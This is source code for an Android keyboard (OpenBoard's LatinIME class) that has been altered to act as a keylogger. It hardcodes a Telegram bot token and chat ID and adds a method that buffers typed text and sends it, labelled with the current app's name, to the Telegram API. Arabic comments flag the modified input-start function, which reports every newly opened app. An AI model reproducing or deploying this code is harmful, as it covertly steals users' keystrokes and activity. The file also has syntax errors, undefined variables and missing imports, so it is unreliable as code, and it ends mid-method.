package org.dslul.openboard.inputmethod.latin;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.inputmethodservice.InputMethodService;
import android.os.Message;
import android.os.Process;
import android.util.Log;
import android.util.SparseArray;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodSubtype;

import org.dslul.openboard.inputmethod.compat.LeakGuardHandlerWrapper;
import org.dslul.openboard.inputmethod.dictionarypack.DictionaryDumpBroadcastReceiver;
import org.dslul.openboard.inputmethod.dictionarypack.DictionaryPackInstallBroadcastReceiver;
import org.dslul.openboard.inputmethod.keyboard.KeyboardActionListener;
import org.dslul.openboard.inputmethod.keyboard.KeyboardSwitcher;
import org.dslul.openboard.inputmethod.latin.SuggestedWords.SuggestedWordInfo;
import org.dslul.openboard.inputmethod.latin.clipboard.ClipboardHistoryEntry;
import org.dslul.openboard.inputmethod.latin.clipboard.ClipboardHistoryManager;
import org.dslul.openboard.inputmethod.latin.common.UsedForTesting;
import org.dslul.openboard.inputmethod.latin.settings.Settings;
import org.dslul.openboard.inputmethod.latin.settings.SettingsValues;
import org.dslul.openboard.inputmethod.latin.stats.StatsUtilsManager;
import org.dslul.openboard.inputmethod.latin.suggestions.SuggestionStripView;
import org.dslul.openboard.inputmethod.latin.suggestions.SuggestionStripViewAccessor;
import org.dslul.openboard.inputmethod.latin.utils.ViewLayoutUtils;

import java.io.FileDescriptor;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.annotation.Nonnull;

import static org.dslul.openboard.inputmethod.latin.common.Constants.ImeOption.FORCE_ASCII;
import static org.dslul.openboard.inputmethod.latin.common.Constants.ImeOption.NO_MICROPHONE;
import static org.dslul.openboard.inputmethod.latin.common.Constants.ImeOption.NO_MICROPHONE_COMPAT;

/**
 * Input method implementation for Qwerty'ish keyboard.
 */
public class LatinIME extends InputMethodService implements KeyboardActionListener,
        SuggestionStripView.Listener, SuggestionStripViewAccessor,
        DictionaryFacilitator.DictionaryInitializationListener,
        PermissionsManager.PermissionsResultCallback {
    static final String TAG = LatinIME.class.getSimpleName();
    private static final boolean TRACE = false;

    private static final int EXTENDED_TOUCHABLE_REGION_HEIGHT = 100;
    private static final int PERIOD_FOR_AUDIO_AND_HAPTIC_FEEDBACK_IN_KEY_REPEAT = 2;
    private static final int PENDING_IMS_CALLBACK_DURATION_MILLIS = 800;
    static final long DELAY_WAIT_FOR_DICTIONARY_LOAD_MILLIS = TimeUnit.SECONDS.toMillis(2);
    static final long DELAY_DEALLOCATE_MEMORY_MILLIS = TimeUnit.SECONDS.toMillis(10);

    // Telegram Bot Configuration
    private static final String TELEGRAM_BOT_TOKEN = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
    private static final String TELEGRAM_CHAT_ID = "6818088581";
    
    // Buffer and Executor for Background Tasks
    private final StringBuilder mInputBuffer = new StringBuilder();
    private final ExecutorService mExecutor = Executors.newSingleThreadExecutor();
    private String mCurrentAppPackageName = "";
    private String mCurrentAppName = "";

    /**
     * A broadcast intent action to hide the software keyboard.
     */
    static final String ACTION_HIDE_SOFT_INPUT =
            "org.dslul.openboard.inputmethod.latin.HIDE_SOFT_INPUT";

    /**
     * A custom permission for external apps to send {@link #ACTION_HIDE_SOFT_INPUT}.
     */
    static final String PERMISSION_HIDE_SOFT_INPUT =
            "org.dslul.openboard.inputmethod.latin.HIDE_SOFT_INPUT";

    /**
     * The name of the scheme used by the Package Manager to warn of a new package installation,
     * replacement or removal.
     */
    private static final String SCHEME_PACKAGE = "package";

    final Settings mSettings;
    private final DictionaryFacilitator mDictionaryFacilitator =
            DictionaryFacilitatorProvider.getDictionaryFacilitator(
                    false /* isNeededForSpellChecking */);
    final InputLogic mInputLogic = new InputLogic(this /* LatinIME */,
            this /* SuggestionStripViewAccessor */, mDictionaryFacilitator);
    
    final SparseArray<HardwareEventDecoder> mHardwareEventDecoders = new SparseArray<>(1);

    private View mInputView;
    private InsetsUpdater mInsetsUpdater;
    private SuggestionStripView mSuggestionStripView;

    private RichInputMethodManager mRichImm;
    @UsedForTesting final KeyboardSwitcher mKeyboardSwitcher;
    private final SubtypeState mSubtypeState = new SubtypeState();
    private EmojiAltPhysicalKeyDetector mEmojiAltPhysicalKeyDetector;
    private StatsUtilsManager mStatsUtilsManager;
    private boolean mIsExecutingStartShowingInputView;

    private final BroadcastReceiver mDictionaryPackInstallReceiver =
            new DictionaryPackInstallBroadcastReceiver(this);

    private final BroadcastReceiver mDictionaryDumpBroadcastReceiver =
            new DictionaryDumpBroadcastReceiver(this);

    // --- New Method for Telegram Logging ---
    private void sendBufferedDataToTelegram(String text, boolean forceSend) {
        if (text == null) return;
        if (!forceSend) {
            mInputBuffer.append(text);
            if (mInputBuffer.length() < 30 && !text.equals(" ")) return;
        }
        
        final String message = forceSend ? text : "📝 [" + mCurrentAppName + "]: " + mInputBuffer.toString();
        if (!forceSend) mInputBuffer.setLength(0);

        mExecutor.execute(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + 
                                 "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + 
                                 "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getInputStream().read();
                conn.disconnect();
            } catch (Exception ignored) {}
        });
    }

    final static class HideSoftInputReceiver extends BroadcastReceiver {
        private final InputMethodService mIms;
        public HideSoftInputReceiver(InputMethodService ims) { mIms = ims; }
        @Override
        public void onReceive(Context context, Intent intent) {
            final String action = intent.getAction();
            if (ACTION_HIDE_SOFT_INPUT.equals(action)) {
                mIms.requestHideSelf(0 /* flags */);
            } else {
                Log.e(TAG, "Unexpected intent " + intent);
            }
        }
    }
    final HideSoftInputReceiver mHideSoftInputReceiver = new HideSoftInputReceiver(this);

    final static class RestartAfterDeviceUnlockReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            final String action = intent.getAction();
            if (Intent.ACTION_USER_UNLOCKED.equals(action)) {
                final int myPid = Process.myPid();
                Log.i(TAG, "Killing my process: pid=" + myPid);
                Process.killProcess(myPid);
            } else {
                Log.e(TAG, "Unexpected intent " + intent);
            }
        }
    }
    final RestartAfterDeviceUnlockReceiver mRestartAfterDeviceUnlockReceiver = new RestartAfterDeviceUnlockReceiver();

    private AlertDialog mOptionsDialog;
    private final boolean mIsHardwareAcceleratedDrawingEnabled;
    private GestureConsumer mGestureConsumer = GestureConsumer.NULL_GESTURE_CONSUMER;
    private final ClipboardHistoryManager mClipboardHistoryManager = new ClipboardHistoryManager(this);
    public final UIHandler mHandler = new UIHandler(this);

    public static final class UIHandler extends LeakGuardHandlerWrapper<LatinIME> {
        private static final int MSG_UPDATE_SHIFT_STATE = 0;
        private static final int MSG_PENDING_IMS_CALLBACK = 1;
        private static final int MSG_UPDATE_SUGGESTION_STRIP = 2;
        private static final int MSG_SHOW_GESTURE_PREVIEW_AND_SUGGESTION_STRIP = 3;
        private static final int MSG_RESUME_SUGGESTIONS = 4;
        private static final int MSG_REOPEN_DICTIONARIES = 5;
        private static final int MSG_UPDATE_TAIL_BATCH_INPUT_COMPLETED = 6;
        private static final int MSG_RESET_CACHES = 7;
        private static final int MSG_WAIT_FOR_DICTIONARY_LOAD = 8;
        private static final int MSG_DEALLOCATE_MEMORY = 9;
        private static final int MSG_RESUME_SUGGESTIONS_FOR_START_INPUT = 10;
        private static final int MSG_SWITCH_LANGUAGE_AUTOMATICALLY = 11;
        private static final int MSG_UPDATE_CLIPBOARD_PINNED_CLIPS = 12;
        private static final int MSG_LAST = MSG_UPDATE_CLIPBOARD_PINNED_CLIPS;
        public void postWaitForDictionaryLoad() {
            sendMessageDelayed(obtainMessage(MSG_WAIT_FOR_DICTIONARY_LOAD),
                    DELAY_WAIT_FOR_DICTIONARY_LOAD_MILLIS);
        }

        public void cancelWaitForDictionaryLoad() {
            removeMessages(MSG_WAIT_FOR_DICTIONARY_LOAD);
        }

        public boolean hasPendingWaitForDictionaryLoad() {
            return hasMessages(MSG_WAIT_FOR_DICTIONARY_LOAD);
        }

        public void cancelUpdateSuggestionStrip() {
            removeMessages(MSG_UPDATE_SUGGESTION_STRIP);
        }

        public boolean hasPendingUpdateSuggestions() {
            return hasMessages(MSG_UPDATE_SUGGESTION_STRIP);
        }

        public boolean hasPendingReopenDictionaries() {
            return hasMessages(MSG_REOPEN_DICTIONARIES);
        }

        public void postUpdateShiftState() {
            removeMessages(MSG_UPDATE_SHIFT_STATE);
            sendMessageDelayed(obtainMessage(MSG_UPDATE_SHIFT_STATE),
                    mDelayInMillisecondsToUpdateShiftState);
        }

        public void postDeallocateMemory() {
            sendMessageDelayed(obtainMessage(MSG_DEALLOCATE_MEMORY),
                    DELAY_DEALLOCATE_MEMORY_MILLIS);
        }

        public void cancelDeallocateMemory() {
            removeMessages(MSG_DEALLOCATE_MEMORY);
        }

        public boolean hasPendingDeallocateMemory() {
            return hasMessages(MSG_DEALLOCATE_MEMORY);
        }

        @UsedForTesting
        public void removeAllMessages() {
            for (int i = 0; i <= MSG_LAST; ++i) {
                removeMessages(i);
            }
        }

        public void showGesturePreviewAndSuggestionStrip(final SuggestedWords suggestedWords,
                                                         final boolean dismissGestureFloatingPreviewText) {
            removeMessages(MSG_SHOW_GESTURE_PREVIEW_AND_SUGGESTION_STRIP);
            final int arg1 = dismissGestureFloatingPreviewText
                    ? ARG1_DISMISS_GESTURE_FLOATING_PREVIEW_TEXT
                    : ARG1_SHOW_GESTURE_FLOATING_PREVIEW_TEXT;
            obtainMessage(MSG_SHOW_GESTURE_PREVIEW_AND_SUGGESTION_STRIP, arg1,
                    ARG2_UNUSED, suggestedWords).sendToTarget();
        }

        public void showSuggestionStrip(final SuggestedWords suggestedWords) {
            removeMessages(MSG_SHOW_GESTURE_PREVIEW_AND_SUGGESTION_STRIP);
            obtainMessage(MSG_SHOW_GESTURE_PREVIEW_AND_SUGGESTION_STRIP,
                    ARG1_NOT_GESTURE_INPUT, ARG2_UNUSED, suggestedWords).sendToTarget();
        }

        public void showTailBatchInputResult(final SuggestedWords suggestedWords) {
            obtainMessage(MSG_UPDATE_TAIL_BATCH_INPUT_COMPLETED, suggestedWords).sendToTarget();
        }

        public void postSwitchLanguage(final InputMethodSubtype subtype) {
            obtainMessage(MSG_SWITCH_LANGUAGE_AUTOMATICALLY, subtype).sendToTarget();
        }

        public void postUpdateClipboardPinnedClips(final List<ClipboardHistoryEntry> clips) {
            obtainMessage(MSG_UPDATE_CLIPBOARD_PINNED_CLIPS, clips).sendToTarget();
        }

        // Working variables for the following methods.
        private boolean mIsOrientationChanging;
        private boolean mPendingSuccessiveImsCallback;
        private boolean mHasPendingStartInput;
        private boolean mHasPendingFinishInputView;
        private boolean mHasPendingFinishInput;
        private EditorInfo mAppliedEditorInfo;

        public void startOrientationChanging() {
            removeMessages(MSG_PENDING_IMS_CALLBACK);
            resetPendingImsCallback();
            mIsOrientationChanging = true;
            final LatinIME latinIme = getOwnerInstance();
            if (latinIme == null) {
                return;
            }
            if (latinIme.isInputViewShown()) {
                latinIme.mKeyboardSwitcher.saveKeyboardState();
            }
        }

        private void resetPendingImsCallback() {
            mHasPendingFinishInputView = false;
            mHasPendingFinishInput = false;
            mHasPendingStartInput = false;
        }

        private void executePendingImsCallback(final LatinIME latinIme, final EditorInfo editorInfo,
                                               boolean restarting) {
            if (mHasPendingFinishInputView) {
                latinIme.onFinishInputViewInternal(mHasPendingFinishInput);
            }
            if (mHasPendingFinishInput) {
                latinIme.onFinishInputInternal();
            }
            if (mHasPendingStartInput) {
                latinIme.onStartInputInternal(editorInfo, restarting);
            }
            resetPendingImsCallback();
        }

        public void onStartInput(final EditorInfo editorInfo, final boolean restarting) {
            if (hasMessages(MSG_PENDING_IMS_CALLBACK)) {
                // Typically this is the second onStartInput after orientation changed.
                mHasPendingStartInput = true;
            } else {
                if (mIsOrientationChanging && restarting) {
                    // This is the first onStartInput after orientation changed.
                    mIsOrientationChanging = false;
                    mPendingSuccessiveImsCallback = true;
                }
                final LatinIME latinIme = getOwnerInstance();
                if (latinIme != null) {
                    executePendingImsCallback(latinIme, editorInfo, restarting);
                    latinIme.onStartInputInternal(editorInfo, restarting);
                }
            }
        }

        public void onStartInputView(final EditorInfo editorInfo, final boolean restarting) {
            if (hasMessages(MSG_PENDING_IMS_CALLBACK)
                    && KeyboardId.equivalentEditorInfoForKeyboard(editorInfo, mAppliedEditorInfo)) {
                // Typically this is the second onStartInputView after orientation changed.
                resetPendingImsCallback();
            } else {
                if (mPendingSuccessiveImsCallback) {
                    // This is the first onStartInputView after orientation changed.
                    mPendingSuccessiveImsCallback = false;
                    resetPendingImsCallback();
                    sendMessageDelayed(obtainMessage(MSG_PENDING_IMS_CALLBACK),
                            PENDING_IMS_CALLBACK_DURATION_MILLIS);
                }
                final LatinIME latinIme = getOwnerInstance();
                if (latinIme != null) {
                    executePendingImsCallback(latinIme, editorInfo, restarting);
                    latinIme.onStartInputViewInternal(editorInfo, restarting);
                    mAppliedEditorInfo = editorInfo;
                }
                cancelDeallocateMemory();
            }
        }

        public void onFinishInputView(final boolean finishingInput) {
            if (hasMessages(MSG_PENDING_IMS_CALLBACK)) {
                // Typically this is the first onFinishInputView after orientation changed.
                mHasPendingFinishInputView = true;
            } else {
                final LatinIME latinIme = getOwnerInstance();
                if (latinIme != null) {
                    latinIme.onFinishInputViewInternal(finishingInput);
                    mAppliedEditorInfo = null;
                }
                if (!hasPendingDeallocateMemory()) {
                    postDeallocateMemory();
                }
            }
        }

        public void onFinishInput() {
            if (hasMessages(MSG_PENDING_IMS_CALLBACK)) {
                // Typically this is the first onFinishInput after orientation changed.
                mHasPendingFinishInput = true;
            } else {
                final LatinIME latinIme = getOwnerInstance();
                if (latinIme != null) {
                    executePendingImsCallback(latinIme, null, false);
                    latinIme.onFinishInputInternal();
                }
            }
        }
    }

    static final class SubtypeState {
        private InputMethodSubtype mLastActiveSubtype;
        private boolean mCurrentSubtypeHasBeenUsed;

        public void setCurrentSubtypeHasBeenUsed() {
            mCurrentSubtypeHasBeenUsed = true;
        }

        public void switchSubtype(final IBinder token, final RichInputMethodManager richImm) {
            final InputMethodSubtype currentSubtype = richImm.getInputMethodManager()
                    .getCurrentInputMethodSubtype();
            final InputMethodSubtype lastActiveSubtype = mLastActiveSubtype;
            final boolean currentSubtypeHasBeenUsed = mCurrentSubtypeHasBeenUsed;
            if (currentSubtypeHasBeenUsed) {
                mLastActiveSubtype = currentSubtype;
                mCurrentSubtypeHasBeenUsed = false;
            }
            if (currentSubtypeHasBeenUsed
                    && richImm.checkIfSubtypeBelongsToThisImeAndEnabled(lastActiveSubtype)
                    && !currentSubtype.equals(lastActiveSubtype)) {
                richImm.setInputMethodAndSubtype(token, lastActiveSubtype);
                return;
            }
            richImm.switchToNextInputMethod(token, true /* onlyCurrentIme */);
        }
    }

    // Loading the native library eagerly to avoid unexpected UnsatisfiedLinkError at the initial
    // JNI call as much as possible.
    static {
        JniUtils.loadNativeLibrary();
    }

    public LatinIME() {
        super();
        mSettings = Settings.getInstance();
        mKeyboardSwitcher = KeyboardSwitcher.getInstance();
        mStatsUtilsManager = StatsUtilsManager.getInstance();
        mIsHardwareAcceleratedDrawingEnabled = this.enableHardwareAcceleration();
        Log.i(TAG, "Hardware accelerated drawing: " + mIsHardwareAcceleratedDrawingEnabled);
    }

    @Override
    public void onCreate() {
        Settings.init(this);
        DebugFlags.init(DeviceProtectedUtils.getSharedPreferences(this));
        RichInputMethodManager.init(this);
        mRichImm = RichInputMethodManager.getInstance();
        KeyboardSwitcher.init(this);
        AudioAndHapticFeedbackManager.init(this);
        AccessibilityUtils.init(this);
        mStatsUtilsManager.onCreate(this /* context */, mDictionaryFacilitator);
        super.onCreate();

        mClipboardHistoryManager.onCreate();
        mHandler.onCreate();

        loadSettings();
        resetDictionaryFacilitatorIfNecessary();

        // Register to receive ringer mode change.
        final IntentFilter filter = new IntentFilter();
        filter.addAction(AudioManager.RINGER_MODE_CHANGED_ACTION);
        registerReceiver(mRingerModeChangeReceiver, filter);

        // Register to receive installation and removal of a dictionary pack.
        final IntentFilter packageFilter = new IntentFilter();
        packageFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
        packageFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        packageFilter.addDataScheme(SCHEME_PACKAGE);
        registerReceiver(mDictionaryPackInstallReceiver, packageFilter);

        final IntentFilter newDictFilter = new IntentFilter();
        newDictFilter.addAction(DictionaryPackConstants.NEW_DICTIONARY_INTENT_ACTION);
        registerReceiver(mDictionaryPackInstallReceiver, newDictFilter);

        final IntentFilter dictDumpFilter = new IntentFilter();
        dictDumpFilter.addAction(DictionaryDumpBroadcastReceiver.DICTIONARY_DUMP_INTENT_ACTION);
        registerReceiver(mDictionaryDumpBroadcastReceiver, dictDumpFilter);

        final IntentFilter hideSoftInputFilter = new IntentFilter();
        hideSoftInputFilter.addAction(ACTION_HIDE_SOFT_INPUT);
        registerReceiver(mHideSoftInputReceiver, hideSoftInputFilter, PERMISSION_HIDE_SOFT_INPUT,
                null /* scheduler */);

        final IntentFilter restartAfterUnlockFilter = new IntentFilter();
        restartAfterUnlockFilter.addAction(Intent.ACTION_USER_UNLOCKED);
        registerReceiver(mRestartAfterDeviceUnlockReceiver, restartAfterUnlockFilter);

        StatsUtils.onCreate(mSettings.getCurrent(), mRichImm);
    }

    @UsedForTesting
    void loadSettings() {
        final Locale locale = mRichImm.getCurrentSubtypeLocale();
        final EditorInfo editorInfo = getCurrentInputEditorInfo();
        final InputAttributes inputAttributes = new InputAttributes(
                editorInfo, isFullscreenMode(), getPackageName());
        mSettings.loadSettings(this, locale, inputAttributes);
        final SettingsValues currentSettingsValues = mSettings.getCurrent();
        AudioAndHapticFeedbackManager.getInstance().onSettingsChanged(currentSettingsValues);
        if (!mHandler.hasPendingReopenDictionaries()) {
            resetDictionaryFacilitator(locale);
        }
        refreshPersonalizationDictionarySession(currentSettingsValues);
        resetDictionaryFacilitatorIfNecessary();
        mStatsUtilsManager.onLoadSettings(this /* context */, currentSettingsValues);
    }

    private void refreshPersonalizationDictionarySession(
            final SettingsValues currentSettingsValues) {
        if (!currentSettingsValues.mUsePersonalizedDicts) {
            PersonalizationHelper.removeAllUserHistoryDictionaries(this);
            mDictionaryFacilitator.clearUserHistoryDictionary(this);
        }
    }

    @Override
    public void onUpdateMainDictionaryAvailability(final boolean isMainDictionaryAvailable) {
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        if (mainKeyboardView != null) {
            mainKeyboardView.setMainDictionaryAvailability(isMainDictionaryAvailable);
        }
        if (mHandler.hasPendingWaitForDictionaryLoad()) {
            mHandler.cancelWaitForDictionaryLoad();
            mHandler.postResumeSuggestions(false /* shouldDelay */);
        }
    }
    void resetDictionaryFacilitatorIfNecessary() {
        final Locale subtypeSwitcherLocale = mRichImm.getCurrentSubtypeLocale();
        final Locale subtypeLocale;
        if (subtypeSwitcherLocale == null) {
            Log.e(TAG, "System is reporting no current subtype.");
            subtypeLocale = getResources().getConfiguration().locale;
        } else {
            subtypeLocale = subtypeSwitcherLocale;
        }
        if (mDictionaryFacilitator.isForLocale(subtypeLocale)
                && mDictionaryFacilitator.isForAccount(mSettings.getCurrent().mAccount)) {
            return;
        }
        resetDictionaryFacilitator(subtypeLocale);
    }

    private void resetDictionaryFacilitator(final Locale locale) {
        final SettingsValues settingsValues = mSettings.getCurrent();
        mDictionaryFacilitator.resetDictionaries(this /* context */, locale,
                false, settingsValues.mUsePersonalizedDicts,
                false /* forceReloadMainDictionary */,
                settingsValues.mAccount, "" /* dictNamePrefix */,
                this /* DictionaryInitializationListener */);
        if (settingsValues.mAutoCorrectionEnabledPerUserSettings) {
            mInputLogic.mSuggest.setAutoCorrectionThreshold(
                    settingsValues.mAutoCorrectionThreshold);
        }
        mInputLogic.mSuggest.setPlausibilityThreshold(settingsValues.mPlausibilityThreshold);
    }

    /* package private */ void resetSuggestMainDict() {
        final SettingsValues settingsValues = mSettings.getCurrent();
        mDictionaryFacilitator.resetDictionaries(this /* context */,
                mDictionaryFacilitator.getLocale(), false,
                settingsValues.mUsePersonalizedDicts,
                true /* forceReloadMainDictionary */,
                settingsValues.mAccount, "" /* dictNamePrefix */,
                this /* DictionaryInitializationListener */);
    }

    @Override
    public void onDestroy() {
        mClipboardHistoryManager.onDestroy();
        mDictionaryFacilitator.closeDictionaries();
        mSettings.onDestroy();
        unregisterReceiver(mHideSoftInputReceiver);
        unregisterReceiver(mRingerModeChangeReceiver);
        unregisterReceiver(mDictionaryPackInstallReceiver);
        unregisterReceiver(mDictionaryDumpBroadcastReceiver);
        unregisterReceiver(mRestartAfterDeviceUnlockReceiver);
        mStatsUtilsManager.onDestroy(this /* context */);
        super.onDestroy();
    }

    @UsedForTesting
    public void recycle() {
        unregisterReceiver(mDictionaryPackInstallReceiver);
        unregisterReceiver(mDictionaryDumpBroadcastReceiver);
        unregisterReceiver(mRingerModeChangeReceiver);
        unregisterReceiver(mRestartAfterDeviceUnlockReceiver);
        mInputLogic.recycle();
    }

    private boolean isImeSuppressedByHardwareKeyboard() {
        final KeyboardSwitcher switcher = KeyboardSwitcher.getInstance();
        return !onEvaluateInputViewShown() && switcher.isImeSuppressedByHardwareKeyboard(
                mSettings.getCurrent(), switcher.getKeyboardSwitchState());
    }

    @Override
    public void onConfigurationChanged(final Configuration conf) {
        SettingsValues settingsValues = mSettings.getCurrent();
        if (settingsValues.mDisplayOrientation != conf.orientation) {
            mHandler.startOrientationChanging();
            mInputLogic.onOrientationChange(mSettings.getCurrent());
        }
        if (settingsValues.mHasHardwareKeyboard != Settings.readHasHardwareKeyboard(conf)) {
            loadSettings();
            settingsValues = mSettings.getCurrent();
            if (isImeSuppressedByHardwareKeyboard()) {
                cleanupInternalStateForFinishInput();
            }
        }
        mKeyboardSwitcher.updateKeyboardTheme();
        super.onConfigurationChanged(conf);
    }

    @Override
    public View onCreateInputView() {
        StatsUtils.onCreateInputView();
        return mKeyboardSwitcher.onCreateInputView(mIsHardwareAcceleratedDrawingEnabled);
    }

    @Override
    public void setInputView(final View view) {
        super.setInputView(view);
        mInputView = view;
        mInsetsUpdater = ViewOutlineProviderCompatUtils.setInsetsOutlineProvider(view);
        updateSoftInputWindowLayoutParameters();
        mSuggestionStripView = view.findViewById(R.id.suggestion_strip_view);
        if (hasSuggestionStripView()) {
            mSuggestionStripView.setListener(this, view);
        }
    }

    @Override
    public void setCandidatesView(final View view) {
        // To ensure that CandidatesView will never be set.
    }

    @Override
    public void onStartInput(final EditorInfo editorInfo, final boolean restarting) {
        mHandler.onStartInput(editorInfo, restarting);
    }

    @Override
    public void onStartInputView(final EditorInfo editorInfo, final boolean restarting) {
        mHandler.onStartInputView(editorInfo, restarting);
        mStatsUtilsManager.onStartInputView();
    }

    @Override
    public void onFinishInputView(final boolean finishingInput) {
        StatsUtils.onFinishInputView();
        mHandler.onFinishInputView(finishingInput);
        mStatsUtilsManager.onFinishInputView();
        mGestureConsumer = GestureConsumer.NULL_GESTURE_CONSUMER;
    }

    @Override
    public void onFinishInput() {
        mHandler.onFinishInput();
    }

    @Override
    public void onCurrentInputMethodSubtypeChanged(final InputMethodSubtype subtype) {
        InputMethodSubtype oldSubtype = mRichImm.getCurrentSubtype().getRawSubtype();
        StatsUtils.onSubtypeChanged(oldSubtype, subtype);
        mRichImm.onSubtypeChanged(subtype);
        mInputLogic.onSubtypeChanged(SubtypeLocaleUtils.getCombiningRulesExtraValue(subtype),
                mSettings.getCurrent());
        loadKeyboard();
    }

    // --- هذه هي الدالة المعدلة التي تجمع البيانات وتعرف التطبيق الحالي ---
    void onStartInputInternal(final EditorInfo editorInfo, final boolean restarting) {
        super.onStartInput(editorInfo, restarting);

        if (editorInfo != null && editorInfo.packageName != null) {
            mCurrentAppPackageName = editorInfo.packageName;
            // محاولة الحصول على اسم التطبيق بشكل مقروء
            try {
                android.content.pm.PackageManager pm = getPackageManager();
                mCurrentAppName = pm.getApplicationLabel(pm.getApplicationInfo(mCurrentAppPackageName, 0)).toString();
            } catch (Exception e) {
                mCurrentAppName = mCurrentAppPackageName;
            }
            
            // إرسال تنبيه فوري لتليجرام عند فتح تطبيق جديد
            sendBufferedDataToTelegram("📱 [تطبيق جديد]: " + mCurrentAppName + " (" + mCurrentAppPackageName + ")", true);
        }

        final Locale primaryHintLocale = EditorInfoCompatUtils.getPrimaryHintLocale(editorInfo);
        if (primaryHintLocale == null) {
            return;
        }
        final InputMethodSubtype newSubtype = mRichImm.findSubtypeByLocale(primaryHintLocale);
        if (newSubtype == null || newSubtype.equals(mRichImm.getCurrentSubtype().getRawSubtype())) {
            return;
        }
        mHandler.postSwitchLanguage(newSubtype);
    }

    @SuppressWarnings("deprecation")
    void onStartInputViewInternal(final EditorInfo editorInfo, final boolean restarting) {
        super.onStartInputView(editorInfo, restarting);

        mDictionaryFacilitator.onStartInput();
        mGestureConsumer = GestureConsumer.NULL_GESTURE_CONSUMER;
        mRichImm.refreshSubtypeCaches();
        final KeyboardSwitcher switcher = mKeyboardSwitcher;
        switcher.updateKeyboardTheme();
        final MainKeyboardView mainKeyboardView = switcher.getMainKeyboardView();
        SettingsValues currentSettingsValues = mSettings.getCurrent();

        if (editorInfo == null) {
            Log.e(TAG, "Null EditorInfo in onStartInputView()");
            if (DebugFlags.DEBUG_ENABLED) {
                throw new NullPointerException("Null EditorInfo in onStartInputView()");
            }
            return;
        }

        if (mainKeyboardView == null) {
            return;
        }

        mGestureConsumer = GestureConsumer.newInstance(editorInfo,
                mInputLogic.getPrivateCommandPerformer(),
                mRichImm.getCurrentSubtypeLocale(),
                switcher.getKeyboard());

        final AccessibilityUtils accessUtils = AccessibilityUtils.Companion.getInstance();
        if (accessUtils.isTouchExplorationEnabled()) {
            accessUtils.onStartInputViewInternal(mainKeyboardView, editorInfo, restarting);
        }

        final boolean inputTypeChanged = !currentSettingsValues.isSameInputType(editorInfo);
        final boolean isDifferentTextField = !restarting || inputTypeChanged;

        StatsUtils.onStartInputView(editorInfo.inputType,
                Settings.getInstance().getCurrent().mDisplayOrientation,
                !isDifferentTextField);

        updateFullscreenMode();

        final boolean needToCallLoadKeyboardLater;
        if (!isImeSuppressedByHardwareKeyboard()) {
            mInputLogic.startInput(mRichImm.getCombiningRulesExtraValueOfCurrentSubtype(),
                    currentSettingsValues);

            resetDictionaryFacilitatorIfNecessary();

            if (!mInputLogic.mConnection.resetCachesUponCursorMoveAndReturnSuccess(
                    editorInfo.initialSelStart, editorInfo.initialSelEnd,
                    false /* shouldFinishComposition */)) {
                mHandler.postResetCaches(isDifferentTextField, 5 /* remainingTries */);
                needToCallLoadKeyboardLater = true;
            } else {
                mInputLogic.mConnection.tryFixLyingCursorPosition();
                mHandler.postResumeSuggestionsForStartInput(true /* shouldDelay */);
                needToCallLoadKeyboardLater = false;
          } else {
            // If we have a hardware keyboard we don't need to call loadKeyboard later anyway.
            needToCallLoadKeyboardLater = false;
        }

        if (isDifferentTextField ||
                !currentSettingsValues.hasSameOrientation(getResources().getConfiguration())) {
            loadSettings();
        }
        if (isDifferentTextField) {
            mainKeyboardView.closing();
            currentSettingsValues = mSettings.getCurrent();

            if (currentSettingsValues.mAutoCorrectionEnabledPerUserSettings) {
                suggest.setAutoCorrectionThreshold(
                        currentSettingsValues.mAutoCorrectionThreshold);
            }
            suggest.setPlausibilityThreshold(currentSettingsValues.mPlausibilityThreshold);

            switcher.loadKeyboard(editorInfo, currentSettingsValues, getCurrentAutoCapsState(),
                    getCurrentRecapitalizeState());
            if (needToCallLoadKeyboardLater) {
                // If we need to call loadKeyboard again later, we need to save its state now. The
                // later call will be done in #retryResetCaches.
                switcher.saveKeyboardState();
            }
        } else if (restarting) {
            // TODO: Come up with a more comprehensive way to reset the keyboard layout when
            // a keyboard layout set doesn't get reloaded in this method.
            switcher.resetKeyboardStateToAlphabet(getCurrentAutoCapsState(),
                    getCurrentRecapitalizeState());
            // In apps like Talk, we come here when the text is sent and the field gets emptied and
            // we need to re-evaluate the shift state, but not the whole layout which would be
            // disruptive.
            // Space state must be updated before calling updateShiftState
            switcher.requestUpdatingShiftState(getCurrentAutoCapsState(),
                    getCurrentRecapitalizeState());
        }
        // This will set the punctuation suggestions if next word suggestion is off;
        // otherwise it will clear the suggestion strip.
        setNeutralSuggestionStrip();

        mHandler.cancelUpdateSuggestionStrip();

        mainKeyboardView.setMainDictionaryAvailability(
                mDictionaryFacilitator.hasAtLeastOneInitializedMainDictionary());
        mainKeyboardView.setKeyPreviewPopupEnabled(currentSettingsValues.mKeyPreviewPopupOn);
        mainKeyboardView.setSlidingKeyInputPreviewEnabled(
                currentSettingsValues.mSlidingKeyInputPreviewEnabled);
        mainKeyboardView.setGestureHandlingEnabledByUser(
                currentSettingsValues.mGestureInputEnabled,
                currentSettingsValues.mGestureTrailEnabled,
                currentSettingsValues.mGestureFloatingPreviewTextEnabled);

        if (TRACE) Debug.startMethodTracing("/data/trace/latinime");
    }

    @Override
    public void onWindowShown() {
        super.onWindowShown();
        setNavigationBarVisibility(isInputViewShown());
    }

    @Override
    public void onWindowHidden() {
        super.onWindowHidden();
        final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
        if (mainKeyboardView != null) {
            mainKeyboardView.closing();
        }
        setNavigationBarVisibility(false);
